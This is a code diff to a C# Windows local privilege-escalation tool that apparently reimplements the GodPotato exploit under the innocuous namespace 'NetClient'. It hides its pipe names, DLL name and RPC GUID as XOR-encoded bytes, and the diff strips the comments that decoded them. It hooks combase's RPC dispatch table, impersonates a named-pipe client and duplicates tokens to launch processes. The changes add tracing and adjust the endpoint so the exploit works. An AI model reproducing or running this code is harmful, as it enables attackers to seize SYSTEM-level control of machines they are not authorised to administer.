@@ -30,32 +30,26 @@ namespace NetClient
             return Encoding.ASCII.GetString(r);
         }
 
-        // "\pipe\epmapper"
         static readonly byte[] _sfx = new byte[] {
             0x09, 0x25, 0x3C, 0x25, 0x30, 0x09, 0x30, 0x25,
             0x38, 0x34, 0x25, 0x25, 0x30, 0x27 };
 
-        // "ncacn_np:localhost/pipe/"
         static readonly byte[] _npp = new byte[] {
             0x3B, 0x36, 0x34, 0x36, 0x3B, 0x0A, 0x3B, 0x25,
             0x6F, 0x39, 0x3A, 0x36, 0x34, 0x39, 0x3D, 0x3A,
             0x26, 0x21, 0x7A, 0x25, 0x3C, 0x25, 0x30, 0x7A };
 
-        // "\\.\pipe\"
         static readonly byte[] _lpp = new byte[] {
             0x09, 0x09, 0x7B, 0x09, 0x25, 0x3C, 0x25, 0x30, 0x09 };
 
-        // "ncacn_ip_tcp:127.0.0.1[9]"
         static readonly byte[] _fill = new byte[] {
             0x3B, 0x36, 0x34, 0x36, 0x3B, 0x0A, 0x3C, 0x25,
             0x0A, 0x21, 0x36, 0x25, 0x6F, 0x64, 0x67, 0x62,
             0x7B, 0x65, 0x7B, 0x65, 0x7B, 0x64, 0x0E, 0x6C, 0x08 };
 
-        // "combase.dll"
         static readonly byte[] _cbm = new byte[] {
             0x36, 0x3A, 0x38, 0x37, 0x34, 0x26, 0x30, 0x7B, 0x31, 0x39, 0x39 };
 
-        // GUID "18f70770-8e64-11cf-9af1-0020af6e72f4" XOR 0x55
         static readonly byte[] _guid = new byte[] {
             0x25, 0x52, 0xA2, 0x4D, 0x31, 0xDB, 0x9A, 0x44,
             0xCF, 0xA4, 0x55, 0x75, 0xFA, 0x3B, 0x27, 0xA1 };
@@ -113,9 +107,7 @@ namespace NetClient
         public const uint CREATE_NO_WINDOW           = 0x08000000;
         public const uint CREATE_UNICODE_ENVIRONMENT = 0x00000400;
         public const uint CREATE_SUSPENDED           = 0x00000004;
-        public const uint STARTF_USESTDHANDLES       = 0x00000100;
         public const uint LOGON_WITH_PROFILE         = 0x00000001;
-        public const uint HANDLE_FLAG_INHERIT        = 0x00000001;
 
         public const uint TOKEN_ASSIGN_PRIMARY    = 0x0001;
         public const uint TOKEN_DUPLICATE         = 0x0002;
@@ -132,12 +124,8 @@ namespace NetClient
         public const uint SE_PRIVILEGE_ENABLED = 0x00000002;
 
         public const int TokenUser = 1;
-        public const int TokenPrivileges = 3;
-        public const int TokenType = 8;
-        public const int TokenImpersonationLevel = 9;
         public const int TokenSessionId = 12;
         public const int TokenIntegrityLevel = 25;
-        public const int TokenElevationType = 18;
 
         public const int SecurityImpersonation = 2;
         public const int TokenPrimaryType = 1;
@@ -288,10 +276,6 @@ namespace NetClient
             uint flags, IntPtr env, string cd, ref STARTUPINFO si,
             out PROCESS_INFORMATION pi);
 
-        [DllImport("kernel32.dll", SetLastError = true)]
-        [return: MarshalAs(UnmanagedType.Bool)]
-        public static extern bool SetHandleInformation(IntPtr h, uint m, uint f);
-
         [DllImport("advapi32.dll", SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
         public static extern bool ImpersonateNamedPipeClient(IntPtr hPipe);
@@ -303,11 +287,6 @@ namespace NetClient
         [DllImport("advapi32.dll", SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
         public static extern bool OpenProcessToken(IntPtr p, uint a, out IntPtr t);
-
-        [DllImport("advapi32.dll", SetLastError = true)]
-        [return: MarshalAs(UnmanagedType.Bool)]
-        public static extern bool OpenThreadToken(IntPtr t, uint a,
-            [MarshalAs(UnmanagedType.Bool)] bool asSelf, out IntPtr tok);
 
         [DllImport("advapi32.dll", SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
@@ -564,15 +543,20 @@ namespace NetClient
     }
 
     // ========================================================================
-    // Dispatch hook — FIXED: IntPtr passthrough, no truncation
+    // Dispatch hook
     // ========================================================================
     class Dp
     {
         readonly Env _e;
+        public static int HookCalls = 0;
+
         public Dp(Env e) { _e = e; }
 
         int Build(IntPtr outPtr)
         {
+            int n = Interlocked.Increment(ref HookCalls);
+            Tr.O("hook fired #" + n + " outPtr=0x" + outPtr.ToInt64().ToString("X16"));
+
             string[] eps = new string[] { _e.ClientEp, Vault.Filler() };
             int sz = 3;
             foreach (var x in eps) sz += x.Length + 1;
@@ -588,6 +572,7 @@ namespace NetClient
 
             foreach (var x in eps)
             {
+                Tr.I("  ep: " + x);
                 foreach (char c in x) { Marshal.WriteInt16(buf, o, (short)c); o += 2; }
                 o += 2;
             }
@@ -796,6 +781,8 @@ namespace NetClient
             string sfx = Vault.PipeSuffix();
             ServerPipe = Vault.LocalPipe() + tag + sfx;
             ClientEp = Vault.NpPrefix() + tag + "[" + sfx + "]";
+            Tr.I("server pipe : " + ServerPipe);
+            Tr.I("client ep   : " + ClientEp);
             Init();
             Bind();
         }
@@ -844,8 +831,9 @@ namespace NetClient
                 UseProtseqFnPtr = _tbl[0];
                 UseProtseqParamCount = Marshal.ReadByte(_procStr, _offsets[0] + 19);
 
-                Tr.O(string.Format("module @ 0x{0:X}  tbl @ 0x{1:X}  pc={2}",
-                    CombaseModule.ToInt64(), DispatchTablePtr.ToInt64(), UseProtseqParamCount));
+                Tr.O(string.Format("module @ 0x{0:X}  tbl @ 0x{1:X}  pc={2}  fn=0x{3:X}",
+                    CombaseModule.ToInt64(), DispatchTablePtr.ToInt64(),
+                    UseProtseqParamCount, UseProtseqFnPtr.ToInt64()));
                 return;
             }
             throw new Exception("combase module missing");
@@ -920,7 +908,6 @@ namespace NetClient
 
                 Tr.O("peer connected");
 
-                // FIX: читаем первые байты RPC-запроса, иначе Impersonate = 1368
                 byte[] tmp = new byte[512];
                 uint got = 0;
                 if (!W.ReadFile(hPipe, tmp, (uint)tmp.Length, out got, IntPtr.Zero))
@@ -970,7 +957,7 @@ namespace NetClient
                     W.CloseHandle(h);
                 }
             }
-            catch { }
+            catch (Exception ex) { Tr.W("stop: " + ex.Message); }
             _th.Join(3000);
         }
 
@@ -1006,10 +993,12 @@ namespace NetClient
             byte[] ob = Convert.FromBase64String(dn);
 
             var src = new Rf(ob);
-            Tr.I("OXID: 0x" + src.StandardObjRef.OX.ToString("X"));
-            Tr.I("IPID: " + src.StandardObjRef.IPID);
+            Tr.I("src OXID: 0x" + src.StandardObjRef.OX.ToString("X"));
+            Tr.I("src OID : 0x" + src.StandardObjRef.OID.ToString("X"));
+            Tr.I("src IPID: " + src.StandardObjRef.IPID);
 
-            var sb = new Rf.Str(TowerProtocol.NP, "localhost");
+            // FIX: TCP/127.0.0.1 — matches original GodPotato
+            var sb = new Rf.Str(TowerProtocol.TCP, "127.0.0.1");
             var sec = new Rf.Sec(0xa, 0xffff, null);
             var dsa = new Rf.Dual(sb, sec);
 
@@ -1017,7 +1006,7 @@ namespace NetClient
                 new Rf.Std(0, 1, src.StandardObjRef.OX, src.StandardObjRef.OID,
                     src.StandardObjRef.IPID, dsa));
             byte[] data = rf.GetBytes();
-            Tr.I("bytes=" + data.Length);
+            Tr.I("marshal bytes=" + data.Length);
 
             using (var ms = new MemoryStream(data))
             {
@@ -1076,6 +1065,7 @@ namespace NetClient
                 Tr.I("sending...");
                 int hr = tg.Fire();
                 Tr.I("hr = 0x" + hr.ToString("X8"));
+                Tr.I("hook calls = " + Dp.HookCalls);
 
                 for (int i = 0; i < 100; i++)
                 { if (env.Grab() != null) break; Thread.Sleep(100); }
